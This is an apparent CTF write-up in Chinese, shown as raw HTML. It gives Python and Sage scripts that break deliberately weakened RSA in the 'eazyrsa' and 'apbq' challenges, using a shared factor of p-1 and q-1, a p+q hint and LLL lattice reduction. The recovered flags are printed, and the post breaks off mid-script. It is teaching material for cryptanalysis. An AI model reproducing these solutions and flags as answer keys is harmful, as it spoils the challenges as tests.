<p><img data-src="https://i-blog.csdnimg.cn/direct/ae98b430553b49d78d78b3f4e9681058.png#pic_center" alt="在这里插入图片描述"></p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/7899de5fe03643afbcc30815a260aeaf.png#pic_center" alt="在这里插入图片描述"></p>
<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto">#</a> Crypto：</h1>
<h2 id="eazyrsa"><a class="markdownIt-Anchor" href="#eazyrsa">#</a> eazyrsa：</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"># encoding:utf-8</span><br><span class="line">from Crypto.Util.number import bytes_to_long, long_to_bytes</span><br><span class="line">from gmpy2 import mpz, iroot, powmod, invert, is_prime</span><br><span class="line">import sys</span><br><span class="line">import multiprocessing as mp</span><br><span class="line"></span><br><span class="line"># 定义常量</span><br><span class="line">N = mpz(</span><br><span class="line">    &#x27;67962725468240199924103144864951334845750492508509360358636648068909779932072313362607631417524914992411826230276465100489023746209605790020210412575433464887238013738989770872867041592441153421617243161413094177629581581728221687772551567927241071007480087793370382177952900925657974338348428988433092737432689512506966089398873760401212521089061934975582692308605433023613521500237258699626587149952370997420510392932840377408736864097301789914658244266522930092113493152991783027162871212338968297436073316959569822974289536559300512091342692975133379473145882007983357289924135373382264527866381118893476257705939&#x27;)</span><br><span class="line"># g是一个500位数，且g整除p-1和q-1</span><br><span class="line">g = mpz(</span><br><span class="line">    &#x27;3235645591686044532495326878291617484542045511433360748778013933565021819649890342389737893735574764418484922895778834144345295691799766302763199373647&#x27;)</span><br><span class="line">e = 65537</span><br><span class="line">C = mpz(</span><br><span class="line">    &#x27;7918937034819399210460701361082120267249016865135589044938397478179178418982216265766430882604707450651405790878761026681351233717846491757101684210544361607883043938000941498442897699091016071609425252346011280078699567193949155766516051130050592046343488075564740812480634431357869210712013396437065989799117830247228129120071415956115563715118301273810713118159274551107354918579047901176471910532333125717712607469726900731370186233984133546278420585661042017307325998441634272568791745798269084955686428143476025911093137683806174746625559312685862694783475952178855060639359433340135424849663386199035593137765&#x27;)</span><br><span class="line"></span><br><span class="line"># 计算辅助变量，使用整数除法 //</span><br><span class="line">h = (N - 1) // g</span><br><span class="line">u = h // g</span><br><span class="line">v = h % g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def worker_search(params):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    工作进程函数，用于在指定的r和s范围内搜索c_exponent。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    r_start, r_end, s_start, s_end, D, b, final, N = params</span><br><span class="line">    for r in range(r_start, r_end):</span><br><span class="line">        target_exponent = r * D</span><br><span class="line">        for s in range(s_start, s_end):</span><br><span class="line">            c_exponent = target_exponent + s</span><br><span class="line">            current = powmod(b, c_exponent, N)</span><br><span class="line">            if current == final:</span><br><span class="line">                return c_exponent</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def solve_c_parallel(num_processes=4, D_multiplier=2):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    使用多进程并行化搜索c，使得 b^c ≡ final mod N。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    sqrt_N = iroot(N, 2)[0]</span><br><span class="line">    C_approx = sqrt_N // (g * g)</span><br><span class="line"></span><br><span class="line">    b = powmod(2, g, N)</span><br><span class="line">    final = powmod(b, u, N)</span><br><span class="line"></span><br><span class="line">    for i in range(2, int(C_approx) + 1):</span><br><span class="line">        # 计算D</span><br><span class="line">        D_root, is_exact = iroot(C_approx, 2)</span><br><span class="line">        D = (D_root + 1) * i</span><br><span class="line"></span><br><span class="line">        # 定义r和s的搜索范围，并将r的范围划分为多个块以并行处理</span><br><span class="line">        step = D // num_processes if D &gt; num_processes else 1</span><br><span class="line">        tasks = []</span><br><span class="line">        for p in range(num_processes):</span><br><span class="line">            r_start = p * step</span><br><span class="line">            r_end = (p + 1) * step if p &lt; num_processes - 1 else D</span><br><span class="line">            s_start = 0</span><br><span class="line">            s_end = D</span><br><span class="line">            params = (r_start, r_end, s_start, s_end, D, b, final, N)</span><br><span class="line">            tasks.append(params)</span><br><span class="line"></span><br><span class="line">        # 创建进程池并分配任务</span><br><span class="line">        with mp.Pool(processes=num_processes) as pool:</span><br><span class="line">            results = pool.map(worker_search, tasks)</span><br><span class="line"></span><br><span class="line">        # 检查是否有任何工作进程找到了c_exponent</span><br><span class="line">        for res in results:</span><br><span class="line">            if res is not None:</span><br><span class="line">                print(f&quot;Solution found: c = &#123;res&#125;&quot;)</span><br><span class="line">                return res</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    c = solve_c_parallel()</span><br><span class="line">    if c is not None:</span><br><span class="line">        print(&quot;c:&quot;, c)</span><br><span class="line"></span><br><span class="line">        # 计算A和B</span><br><span class="line">        A = u - c</span><br><span class="line">        B = v + c * g</span><br><span class="line"></span><br><span class="line">        # 求解二次方程x^2 - Bx + A = 0</span><br><span class="line">        discriminant = B * B - 4 * A</span><br><span class="line">        sqrt_discriminant, is_perfect_square = iroot(discriminant, 2)</span><br><span class="line">        if not is_perfect_square or sqrt_discriminant * sqrt_discriminant != discriminant:</span><br><span class="line">            print(&quot;判别式不是完全平方数。&quot;)</span><br><span class="line">            sys.exit(1)</span><br><span class="line"></span><br><span class="line">        x = (B + sqrt_discriminant) // 2</span><br><span class="line">        y = (B - sqrt_discriminant) // 2</span><br><span class="line"></span><br><span class="line">        # 计算a和b</span><br><span class="line">        a_val = x // 2</span><br><span class="line">        b_val = y // 2</span><br><span class="line"></span><br><span class="line">        # 计算p和q</span><br><span class="line">        p = 2 * g * a_val + 1</span><br><span class="line">        q = 2 * g * b_val + 1</span><br><span class="line"></span><br><span class="line">        # 验证p和q是否为素数</span><br><span class="line">        if not is_prime(p):</span><br><span class="line">            print(&quot;p 不是素数。&quot;)</span><br><span class="line">            sys.exit(1)</span><br><span class="line">        if not is_prime(q):</span><br><span class="line">            print(&quot;q 不是素数。&quot;)</span><br><span class="line">            sys.exit(1)</span><br><span class="line"></span><br><span class="line">        # 计算phi(N)</span><br><span class="line">        phi_N = (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line">        # 计算私钥指数d</span><br><span class="line">        try:</span><br><span class="line">            d = invert(e, phi_N)</span><br><span class="line">        except ZeroDivisionError:</span><br><span class="line">            print(&quot;e与phi(N)不互质，无法找到逆元。&quot;)</span><br><span class="line">            sys.exit(1)</span><br><span class="line"></span><br><span class="line">        # 解密密文</span><br><span class="line">        m = powmod(C, d, N)</span><br><span class="line">        decrypted_message = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line">        print(&quot;解密消息:&quot;, decrypted_message)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;未找到c的解。&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>Solution found: c = 51589121<br>
c: 51589121<br>
 解密消息: b’flag {bf82d1cd-67b1-42bd-a7b5-f119f0246dfe}’</p>
<p>有原题</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9mNjFkLmdpdGh1Yi5pby9jcnlwdG8vUlNBL2h1d2FuZ2JlaTIwMTlfQ3J5cHRvMS8=">https://f61d.github.io/crypto/RSA/huwangbei2019_Crypto1/</span></p>
<h2 id="apbq"><a class="markdownIt-Anchor" href="#apbq">#</a> apbq：</h2>
<p>第一部分</p>
<p><em>ϕ</em>=<em>n</em>1−<em>h</em>1+1=<em>p</em>×<em>q</em>−(<em>p</em>+<em>q</em>)+1=(<em>p</em>−1)(<em>q</em>−1)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">from gmpy2 import gmpy2</span><br><span class="line"></span><br><span class="line">hint1 = 18978581186415161964839647137704633944599150543420658500585655372831779670338724440572792208984183863860898382564328183868786589851370156024615630835636170</span><br><span class="line">n1,e1 = (89839084450618055007900277736741312641844770591346432583302975236097465068572445589385798822593889266430563039645335037061240101688433078717811590377686465973797658355984717210228739793741484666628342039127345855467748247485016133560729063901396973783754780048949709195334690395217112330585431653872523325589, 65537)</span><br><span class="line">c1 = 23664702267463524872340419776983638860234156620934868573173546937679196743146691156369928738109129704387312263842088573122121751421709842579634121187349747424486233111885687289480494785285701709040663052248336541918235910988178207506008430080621354232140617853327942136965075461701008744432418773880574136247</span><br><span class="line">phi = n1-hint1+1</span><br><span class="line">d = gmpy2.invert(e1,phi)</span><br><span class="line">m = pow(c1,d,n1)</span><br><span class="line">flag1 =long_to_bytes(m)</span><br><span class="line">print(flag1)</span><br><span class="line">#b&#x27;flag&#123;yOu_can_&#x27;</span><br></pre></td></tr></table></figure>
<p>第二部分</p>
<p>想办法因式分解一个 RSA 模数 𝑛=𝑝×𝑞<em>n</em>=<em>p</em>×<em>q</em></p>
<p>先求出 p,q</p>
<p>然后定格矩阵<br>
 DownUniderCTF 2023 相似</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Rvd25VbmRlckNURi9DaGFsbGVuZ2VzXzIwMjNfUHVibGljL2Jsb2IvbWFpbi9jcnlwdG8vYXBicS1yc2EtaWkvc29sdmUvc29sdi5zYWdl">https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/crypto/apbq-rsa-ii/solve/solv.sage</span></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line"># n, c, hints</span><br><span class="line">c = 30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span><br><span class="line"></span><br><span class="line">n, e = (73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819, 65537)</span><br><span class="line"></span><br><span class="line">V = hints = [18167664006612887319059224902765270796893002676833140278828762753019422055112981842474960489363321381703961075777458001649580900014422118323835566872616431879801196022002065870575408411392402196289546586784096, 16949724497872153018185454805056817009306460834363366674503445555601166063612534131218872220623085757598803471712484993846679917940676468400619280027766392891909311628455506176580754986432394780968152799110962, 17047826385266266053284093678595321710571075374778544212380847321745757838236659172906205102740667602435787521984776486971187349204170431714654733175622835939702945991530565925393793706654282009524471957119991, 25276634064427324410040718861523090738559926416024529567298785602258493027431468948039474136925591721164931318119534505838854361600391921633689344957912535216611716210525197658061038020595741600369400188538567, 22620929075309280405649238349357640303875210864208854217420509497788451366132889431240039164552611575528102978024292550959541449720371571757925105918051653777519219003404406299551822163574899163183356787743543, 20448555271367430173134759139565874060609709363893002188062221232670423900235907879442989619050874172750997684986786991784813276571714171675161047891339083833557999542955021257408958367084435326315450518847393, 16581432595661532600201978812720360650490725084571756108685801024225869509874266586101665454995626158761371202939602347462284734479523136008114543823450831433459621095011515966186441038409512845483898182330730, 23279853842002415904374433039119754653403309015190065311714877060259027498282160545851169991611095505190810819508498176947439317796919177899445232931519714386295909988604042659419915482267542524373950892662544, 16542280976863346138933938786694562410542429842169310231909671810291444369775133082891329676227328401108505520149711555594236523078258701726652736438397249153484528439336008442771240980575141952222517324476607, 17054798687400834881313828738161453727952686763495185341649729764826734928113560289710721893874591843482763545781022050238655346441049269145400183941816006501187555169759754496609909352066732267489240733143973, 22115728663051324710538517987151446287208882441569930705944807337542411196476967586630373946539021184108542887796299661200933395031919501574357288914028686562763621166172668808524981253976089963176915686295217, 19324745002425971121820837859939938858204545496254632010818159347041222757835937867307372949986924646040179923481350854019113237172710522847771842257888083088958980783122775860443475680302294211764812636993025, 17269103712436870749511150569030640471982622900104490728908671745662264368118790999669887094371008536628103283985205839448583011077421205589315164079023370873380480423797655480624151812894997816254147210406492, 17365467616785968410717969747207581822018195905573214322728668902230086291926193228235744513285718494565736538060677324971757810325341657627830082292794517994668597521842723473167615388674219621483061095351780, 20823988964903136690545608569993429386847299285019716840662662829134516039366335014168034963190410379384987535117127797097185441870894097973310130525700344822429616024795354496158261293140438037100429185280939, 19068742071797863698141529586788871165176403351706021832743114499444358327620104563127248492878047796963678668578417711317317649158855864613197342671267006688211460724339403654215571839421451060657330746917459, 20089639597210347757891251257684515181178224404350699015820324544431016085980542703447257134320668961280907495580251880177990935443438799776252979843969984270461013888122703933975001704404129130156833542263882, 22344734326131457204500487243249860924828673944521980798994250859372628295695660076289343998351448667548250129358262592043131205967592613289260998148991388190917863322690137458448696392344738292233285437662495, 22688858027824961235755458925538246922604928658660170686458395195714455094516952026243659139809095639584746977271909644938258445835519951859659822660413616465736923822988993362023001205350387354001389518742538, 21286046487289796335501643195437352334100195831127922478044197411293510360710188581314023052580692810484251118253550837525637065385439859631494533102244585493243972819369812352385425700028640641292410326514111, 21542729548465815605357067072323013570796657575603676418485975214641398139843537820643982914302122976789859817102498484496409546012119998359943274203338400776158986205776474024356567247508744784200354385060666, 22319592382753357951626314613193901130171847776829835028715915533809475362288873045184870972146269975570664009921662023590318988850871708674240304838922536028975978222603171333743353770676344328056539379240160, 25195209191944761648246874631038407055240893204894145709996399690807569652160721616011712739214434932639646688187304865397816188999592774874989401871300784534538762135830014255425391132306536883804201055992313, 18257804244956449160916107602212089869395886846990320452133193087611626919926796845263727422042179229606817439442521540784268169177331707314788427670112999551683927934427716554137597798283300120796277229509678, 20293403064916574136692432190836928681820834973375054705153628740577159076332283715581047503287766236543327123639746352358718218140738999496451259789097826888955418315455420948960832865750253988992454128969953, 15967654820584966012628708475666706277218484919923639492431538068059543232562431059752700377242326527417238151501168940191488179144049286512652111172149113549072003881460743035279388672984805823560897688895124, 25144187979876039024245879200325843092774389926620026124061775431569974232758799200333888039013494603721065709195353330350750055309315207499741437181094874894647736904055829877859906318073991986020178158776286, 15736932921640444103019961538951409924080453868073105830403926861058056351553271238438325117113945341892868641345117717666354739204401152657265824568724844930574396801692131746182948347887298330990039956813130, 18831072673439732764722762485733622234889447953507582396819704359771208236721692820362137219509611319088756045211407777880521726782697895768017460064889670066178710804124631128581556314122255564861269062385337, 23800437561684813552661749774840752013501533683948618798811470214669024646396165487093720960221009038817909066075238937189371227098032581450466402462014437421254375846263830927945343485988463525070074913720710, 24402191070622494792723290726249952159888270689258801831518209605331984684494095167423722682814769395395011136124403802097229547003802312444913008194461779426175966774202219703164060353710247619639616444797670, 20215481513831963554421686543560596857659844027486522940060791775984622049024173363533378455076109165728144576719015392033536498353094895564917644840994662704362121549525329105205514332808950206092190939931448, 18384453917605955747212560280232547481041600196031285084598132475801990710125754705645482436436531608696373462641765399622296314590071558616193035939108523357020287896879479452040171765916716377102454266933226, 21890401344164908103930010123434944359446535642544335610455613014563290097498740447164765588532234051104173227090428486681237432196639010849051113283297943367655458678533223039415083212229970648958070799280218, 18379893441293694747570620009241814202936873442370354246029979042247705730610190888710981918183390028386451290137755339890329474403224043675724851314770861939082447728194632548864823398818221526652331319263027, 18715827130228986951360013590464775001019026913384718876134449689773600060962392738619405370033085704046027397895627933844824630723286144367800484157574548819065406118338665931032779491897783504790669824301288, 13588739911708699123450670852772302012518315143187739886523841133752009403411431627334135210166268158490674049617489193734568451811305631563767138879895461211915128972052001136464325219117009268526575020143259, 18506039912943821193373920483847347155611306173368341979655092778147169768984477236224526786441466933360500418090210912574990962709452725122792963919616633389125605160796446674502416801964271004625701238202575, 22167985517547342184812919437069844889650448522260359154086923601900060998572245598167213217022051141570075284051615276464952346620430587694188548679895095556459804921016744713098882496174497693878187665372865, 21507363933875318987283059841465034113263466805329282129011688531718330888226928182985538861888698160675575993935166249701145994333840516459683763957425287811252135418288516497258724668090570720893589001392220, 20250321586608105267884665929443511322540360475552916143405651419034772061789298150974629817817611591100450468070842373341756704300393352252725859102426665187194754280129749402796746118608937061141768301995522, 16104259151024766025645778755951638093681273234415510444173981198301666343334808614748361662637508091511498829253677167171091582942780017355912433497214576425697459483727777273045993446283721290714044600814203, 14560242181138184594433372530956542527312169507277535425067427080573272033961044062335960097446781943943464713852520415535775461964590009720592053626735276833191667395201287169782350381649400286337671320581068, 16239347596615402699390026749150381714807445218767496868569282767673828662340774349530405347667558555781433774705139593469838946201218537641296949822639509296966092138954685186059819628696340121356660166937131, 21344472317634795288252811327141546596291633424850284492351783921599290478005814133560171828086405152298309169077585647189366292823613547973428250604674234857289341613448177246451956695700417432794886277704716, 16053809990112020217624905718566971288375815646771826941011489252522755953750669513046736360397030033178139614200701025268874379439106827823605937814395162011464610496629969260310816473733828751702925621950679, 18917855883623050190154989683327838135081813638430345099892537186954876489710857473326920009412778140451855952622686635694323466827034373114657023892484639238914593012175120540210780102536003758794571846502397, 22690171278715056779052233972642657173540399024770527983659216197108042021644328773010698851143953503599329885607621773816718008861742027388432534850163666629476315340137626681994316866368449548292328156728206, 21087818524872480052313215092436868441694786060866149491087132591272640372512484925209820065536439188250579925233059144898601140234767300574307770064543499923712729705795392684173268461519802573563186764326797, 18439753470094841291394543396785250736332596497190578058698960152415339036714664835925822942784700917586270640813663002161425694392259981974491535370706560550540525510875465091384383255081297963169390777475352, 20105719699015744146039374208926740159952318391171137544887868739518535254000803811729763681262304539724253518465850883904308979964535242371235415049403280585133993732946919550180260852767289669076362115454200, 17251599484976651171587511011045311555402088003441531674726612079301412643514474016351608797610153172169183504289799345382527665445027976807805594288914226822374523878290416047130731166794970645275146679838899, 23027331991437585896233907022469624030630702237261170259290872847355304456043379238362120518409085840638396736666056992747627271193089116095167049248270541979716594671069985183070290375121270398623215587207529, 18158149685496169798299129683009221264185608469410295069411669832919646968324946121757411511373498747604679198739125835462814352243797919744572086307939585501566092705355693015625009717017077302201663788208609, 18276153196656501517216055049560959047263892309902154534799806637704337317207294332426798932144785240877892837491213916540255237702169595754963908689566362060228840286531616263506272071630209104758589482803348, 19830654702835464289082520892939657653574451119898587213320188332842291005863699764597454403874285715252681820027919359194554863299385911740908952649966617784376852963552276558475217168696695867402522508290055, 15349828226638644963106414986240676364822261975534684137183044733508521003843559094515387144949811552173241406076270015291925943459603622043168219534080772937297911323165839870364550841685270125556125756627553, 20923687596111161976478930953796496927811701530608223491138786355445002217973253897724452954815797952200740069102515860924306246841340715110620719064010080520601890251137419840158983682372232110885549732743013, 21095748006022412831703352650023882351218414866517568822818298949510471554885207645049385966827210564667371665855668707424105040599599901165292360321667007968065708796593851653085339928947755081203265281357013, 20136320433636422315432754195821125224777716034031656342233368000257459497472596860252592531939146543685406198978058242599116859263546329669263543660114747385041549283367183026001454445297981439938401547228229, 16496919752274418275948572022974868132658743151124597724312835413857298109100258912203517423633396955060591787380445877361136405137884456764770035346437177846666365911942996404514058688909577420388537479730705, 13788728438272498164727737074811797093818033799836159894472736480763530670013682288670889124484670336660448907074673625466218166413315342420667608074179975422284472184048790475129281850298519112884101776426380, 24852871485448795332267345793743281093931161235481251209948049584749441451621572752080662697610253315331335180611651946374137068256112152253681972406000252076016099200912670370417045090034045383991812756120791, 18663346319122078996775762643035864683521213720864038756854558668694021987970601131985163948257100423991091156649638455828855082098689641225427227191064496066436196910238564311309556938903101074363279783438714, 21400068681031931459396470039651524575262457489792894764406364952394476440804779651233022862527636114968325782197380721095406628084183336358459476006267416033892771932528688312375109463803215034905281657962293, 16044158155847172030103761204572942507195578382208455423846603003318483484698088948486132040995746837257705704187725306831142305215342467016564452582165866039427184607605673304595194959499145031211096109534167, 16518253246325822837502418827700493807621067058438396395472266350036385535241769917459657069911028720968654253735107131282350340465691670072304718987805883113410923109703284511709226857412404454224134480632696, 22032469066601123287586507039704080058983969235246539501189720236880312024198451198788699002335010120658564926677243708367430773661097221076615953342733896063909953602379936312639192315223258556134958059637605, 17474611942177808070315948910226643697957069578572244709354155010512694059987765040746148981545760660371360975936526076852619987733316042847813177383519241505024635332293992920023420060610648140841369822739716, 20097265939024591617239874622716452182434300498447992668997438018575636772416262543204370899462096267444545094719202447520254303983442269757551626971917981420832391886214473318353984504467919530676605744560570, 18170251482705061226968041449812078923477452841162650888922564215790088545936753453513162197661916172215859504545409274440450807677845894292177296835154674774694992388033874349807244020099167681146357128785394, 18084007437523118129421476751918491055914528331902780911288404344016551650138679157754567938593688369062981279371320169939281882307797009116458871503759873023914718337944953764426183937635379280572434676575757, 17001811604221128900675671565539617923973183364469396458234914432162200119518252971721448274846235879320362924206656971472493711107677598961463553324277826426691784458674010708635756004550789902368338633272118, 20217009574515126619724139485885721324936960849401637840860565569588595992087537454744066905387396266844236387315004915383456736142307523960394594650088663019228826091309049211780607761862663242437656610298243, 25534440916970201550118006203706860249111087748000550226680885431006136131742280963090650607632467666558508520152535105122661615376298673454198064361094319699307084117001019115669670029195171047304283891069792, 18871869316294018605789169171879572816494092699556970507058691345095743053290043643010965660058888064972257990750611470141816041727746767146945121588515830427165739580791663951175220638901672353681640741068573, 20173968537913641339915058056878181363456579537994317562789857397928196160113042659777558550242315788417022891612723148843142958668959046890197219991727894451795438138592005695329607326086644956073759609743066, 20601943394990265144021144365970164017319737300436518536503270346147112565303361487668388700369636611354280332841812324530501569200031186584749278453651172121161814207025650519637781007286435981682228528706305, 16397528630087028144645213166977866073543422560337716097539091258081008408890966764995645782823950721804205427713461441138000880478364026137452291234097219085473748076681729365744710225699866258812642458184750, 21373350333568141000876969785296802670776508778278005158047105058430550665787088265486222905402690421155861103648370249249790560185790723042867282734693553039477436055775198037042047438047898227097749354619822, 17767469767416052322357795736899648760868316512079849340028040817353808899589201201338152114229279980849491049574543361275046276135253417685681262008211582060955974064559129311524323185960856955462761555353091, 22148352529815091269441663541923247974004854058764556809596705832663604786920964849725772666340437231503146814919702525852955831173047034475925578238466977606367380212886384487294569287202762127531620290162734, 21663842528026621741414050256553652815372885707031383713657826718944735177083300302064509342116651731671570591336596953911570477161536730982887182434407761036442993588590230296643001682944654490645815177777455, 20219077358929317461660881724990436334639078047412693497584358963241840513748365548465302817975329987854784305275832045889690022909383530837382543579292451297269623663257098458645056099201050578472103957851128, 18255302182526662903763852563401346841065939531070045000414364747445988455597258924280193695407035356029557886165605853810182770534711966292253269625917149411889979307227493949293798772727125069093642134972336, 24926064145128749429079117171467042019887257504329103038171762786986349157515552927216574990423327013202735544601170247730647598931030432792167867343343213411600516855009788294067588153504026267213013591793027, 22369607314724468760253123915374991621544992437057652340350735935680183705467064876346663859696919167243522648029531700630202188671406298533187087292461774927340821192866797400987231509211718089237481902671100, 16994227117141934754898145294760231694287000959561775153135582047697469327393472840046006353260694322888486978811557952926229613247229990658445756595259401269267528233642142950389040647504583683489067768144570, 21758885458682118428357134100118546351270408335845311063139309657532131159530485845186953650675925931634290182806173575543561250369768935902929861898597396621656214490429009706989779345367262758413050071213624, 20156282616031755826700336845313823798147854495428660743884481573484471099887576514309769978525225369254700468742981099548840277532978306665910844928986235042420698332201264764734685502001234369189521332392642, 23291765247744127414491614915358658114280269483384022733002965612273627987872443453777028006606037159079637857473229879140366385523633075816362547967658930666106914269093225208138749470566410361196451552322613, 19807792217079652175713365065361659318870738952921195173619551645956745050506271953949139230097128034416815169649874760890189515620232505703162831090225715453502422905418824316957257395992121750661389503495033, 22074209373194902539215367382758486068533032275912313703269990627206774967653336496619231924013216321042649461711292555464574124714934511202231319963361912937842068483700298097209400217869036338644607607557860, 19678336511265998427322297909733474384702243426420286924671444552444079816707773485084891630780465895504253899943221044355971296122774264925882685351095921532685536165514189427245840338009573352081361238596378, 24746314790210393213546150322117518542380438001687269872679602687597595933350510598742749840102841364627647151669428936678130556027300886850086220074563664367409218038338623691372433831784916816798993162471163, 19346137206512895254202370018555139713690272833895195472766704715282164091959131850520571672509601848193468792313437642997923790118115476212663296111963644011010744006086847599108492279986468255445160241848708, 22739514514055088545643169404630736699361136323546717268615404574809011342622362833245601099992039789664042350284789853188040159950619203242924511038681127008964592137006103547262538912024671048254652547084347, 21491512279698208400974501713300096639215882495977078132548631606796810881149011161903684894826752520167909538856354238104288201344211604223297924253960199754326239113862002469224042442018978623149685130901455, 19381008151938129775129563507607725859173925946797075261437001349051037306091047611533900186593946739906685481456985573476863123716331923469386565432105662324849798182175616351721533048174745501978394238803081, 19965143096260141101824772370858657624912960190922708879345774507598595008331705725441057080530773097285721556537121282837594544143441953208783728710383586054502176671726097169651121269564738513585870857829805]</span><br><span class="line"></span><br><span class="line">k = 2^(512 - 180)</span><br><span class="line"></span><br><span class="line">M = Matrix.column([k * v for v in V]).augment(Matrix.identity(len(V)))</span><br><span class="line">B = [b[1:] for b in M.LLL()]</span><br><span class="line">M = (k * Matrix(B[:len(V)-2])).T.augment(Matrix.identity(len(V)))</span><br><span class="line">B = [b[-len(V):] for b in M.LLL() if set(b[:len(V)-2]) == &#123;0&#125;]</span><br><span class="line"></span><br><span class="line">for s, t in itertools.product(range(100), repeat=2):</span><br><span class="line">    T = s*B[0] + t*B[1]</span><br><span class="line">    a1, a2, a3 = T[0], T[1], T[2]</span><br><span class="line">    kq = gcd(a1 * hints[1] - a2 * hints[0], n)</span><br><span class="line">    if 1 &lt; kq &lt; n:</span><br><span class="line">        print(&#x27;find!&#x27;, kq, s, t)</span><br><span class="line">        break</span><br><span class="line">for i in range(2**16, 1, -1):</span><br><span class="line">    if kq % i == 0:</span><br><span class="line">        kq //= i</span><br><span class="line">q = int(kq)</span><br><span class="line">p = int(n // kq)</span><br><span class="line">print(&#x27;p&#x27;, p)</span><br><span class="line">print(&#x27;q&#x27;,q)</span><br><span class="line">#8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549 0 1</span><br><span 